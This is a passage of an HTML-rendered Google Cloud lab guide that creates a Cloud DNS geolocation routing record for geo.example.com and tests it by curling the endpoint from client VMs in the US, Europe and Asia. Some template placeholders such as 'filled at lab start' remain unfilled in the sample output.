role="presentation" style="padding-right: 0.1px;">Created [https://dns.googleapis.com/dns/v1/projects/routing-policy-lab/managedZones/example].</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><h4 id='task-7-create-cloud-dns-routing-policy'><span>Task 7. Create Cloud DNS Routing Policy</span></h4><p><span>In this section, configure the Cloud DNS Geolocation Routing Policy. You will create a record set in the </span><code>example.com</code><span> zone that you created in the previous section.</span></p><h5 id='create'><span>Create</span></h5><ul><li><p><span>Use the </span><code>gcloud dns record-sets create</code><span> command to create the geo.example.com recordset:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud dns record-sets create geo.example.com \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--ttl=5 --type=A --zone=example \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--routing-policy-type=GEO \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--routing-policy-data=""Region 1"=$US_WEB_IP;"Region 2"=$EUROPE_WEB_IP"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><p><span>You are creating an A record with a Time to Live (TTL) of 5 seconds. The policy type is GEO, and the </span><code>routing_policy_data</code><span> field accepts a semicolon-delimited list of the format </span><code>${region}:${rrdata},${rrdata}</code><span>.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: geo.example.com.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">TYPE: A</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">TTL: 5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DATA: "filled at lab start": 10.142.0.3; "Region 2": 10.154.0.3</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><h5 id='verify'><span>Verify</span></h5><ul><li><p><span>Use the </span><code>dns record-sets list</code><span> command to verify that the </span><code>geo.example.com</code><span>DNS record is configured as expected:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud dns record-sets list --zone=example</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The output shows that an A record with a TTL of 5 is created for </span><code>geo.example.com</code><span>, and the data matches our server set up in each region.</span></p><p><span>Note that in gcloud, the DATA value under geo.example.com may include United States and Europe regions that differ from the sample output below.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: example.com.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">TYPE: NS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">TTL: 21600</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DATA: ns-gcp-private.googledomains.com.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: example.com.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">TYPE: SOA</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">TTL: 21600</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DATA: ns-gcp-private.googledomains.com. cloud-dns-hostmaster.google.com. 1 21600 3600 259200 300</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: geo.example.com.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">TYPE: A</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">TTL: 5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DATA: "REGION": 10.142.0.3; "Region 2": 10.154.0.3</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 315px;"></div><div class="CodeMirror-gutters" style="display: none; height: 315px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create the Private Zone</span></p><p>&nbsp;</p><h4 id='task-8-testing'><span>Task 8. Testing</span></h4><p><span>It&#39;s time to test the configuration. In this section, you will SSH into all the client VMs. Since all of the web server VMs are behind the </span><code>geo.example.com</code><span> domain, you will use </span><code>CURL</code><span> command to access this endpoint.</span></p><p><span>Since you are using a Geolocation policy, the expected result is that:</span></p><ul><li><p><span>The client in the US should always get a response from the </span><code>&lt;Zone 1</code><span> region.</span></p></li><li><p><span>The client in Europe should always get a response from the </span><code>Zone 2</code><span> region.</span></p></li></ul><h5 id='testing-from-the-client-vm-in-europe'><span>Testing from the client VM in Europe</span></h5><ol start='' ><li><p><span>Use the </span><code>gcloud compute ssh</code><span> command to log into the client VM:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh europe-client-vm --zone "Zone 2" --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Follow prompts to SSH into the machine. When asked to enter the passphrase, leave the field blank and press the Enter key twice.</span></p></li></ol><p><span>Once complete, the command line should change to &quot;</span><code>user_name@europe-client-vm:~$</code><span>&quot;</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Warning: Permanently added 'compute.4621780534809863836' (ECDSA) to the list of known hosts.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Linux europe-client-vm 4.19.0-18-cloud-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">The programs included with the Debian GNU/Linux system are free software;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">the exact distribution terms for each program are described in the</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">individual files in /usr/share/doc/*/copyright.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">permitted by applicable law.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">user_name@europe-client-vm:~$</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><h5 id='use-curl-to-access-the-web-server'><span>Use </span><code>curl</code><span> to access the web server</span></h5><ol start='' ><li><p><span>Now that you are in the client VM, use the </span><code>CURL</code><span> command to access the </span><code>geo.example.com</code><span> endpoint. The loop is configured to run the command ten times with a sleep timer of 6 seconds:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">for i in {1..10}; do echo $i; curl geo.example.com; sleep 6; done</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Since the TTL on the DNS record is set to 5 seconds, a sleep timer of 6 seconds has been added. The sleep timer will make sure that you get an uncached DNS response for each cURL request. This command will take approximately one minute to complete.</span></p><p><span>The expected output is &quot;Page served from: </span><code>Zone 2</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.96875px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">5</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">6</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">8</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">9</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">10</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Page served from: "Zone 2"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 450px;"></div><div class="CodeMirror-gutters" style="display: none; height: 450px;"></div></div></div></pre><ol start='' ><li><p><span>Run this test multiple times and analyze the output to see which server is responding to the request. The client should always receive a response from a server in the client&#39;s region.</span></p></li></ol><h5 id='getting-back-to-cloud-shell'><span>Getting back to Cloud Shell</span></h5><ul><li><p><span>Once you have run the test multiple times, exit the client VM in Europe by typing &quot;</span><code>exit</code><span>&quot; in the VM&#39;s command prompt. This will bring you back to the Cloud Shell console.</span></p></li></ul><h5 id='testing-from-the-client-vm-in-us-east1'><span>Testing from the client VM in us-east1</span></h5><p><span>Now perform the same test from the client VM in the US.</span></p><ol start='' ><li><p><span>Use the </span><code>gcloud</code><span> command below to SSH into the us-client-vm:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh us-client-vm --zone "Zone 1" --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Use the </span><code>curl</code><span> command to access </span><code>geo.example.com</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">for i in {1..10}; do echo $i; curl geo.example.com; sleep 6; done</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Now analyze the output to see which server is responding to the request. The client should always receive a response from a server in the client&#39;s region. The expected output is &quot;Page served from: </span><code>&lt;filled at lab start&gt;</code><span>&quot;.</span></p></li><li><p><span>Once you have run the test multiple times, exit the client VM in the US by typing &quot;</span><code>exit</code><span>&quot; in the VM&#39;s command prompt.</span></p></li></ol><h5 id='testing-from-the-client-vm-in-asia'><span>Testing from the client VM in Asia</span></h5><p><span>So far you have tested the setup from the United States and Europe. You have servers running in both the regions and have matching record sets for both the regions in Cloud DNS routing policy. There is no matching policy item for the region within Asia (selected earlier) in the Cloud DNS routing policy.</span></p><p><span>The Geolocation policy will apply a &quot;nearest&quot; match for source location when the source of the traffic doesn&#39;t match any policy items exactly. This means that the Asia client should be directed to the nearest web server.</span></p><p><span>In this section, you will resolve the </span><code>geo.example.com</code><span> domain from the client VM in Asia and will analyze the response.</span></p><ol start='' ><li><p><span>SSH into the asia-client-vm. For </span><code>&lt;SELECTED-ZONE&gt;</code><span>, use the zone that you used to create the Asia client.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh asia-client-vm --zone &lt;SELECTED-ZONE&gt; --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Then access geo.example.com:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background 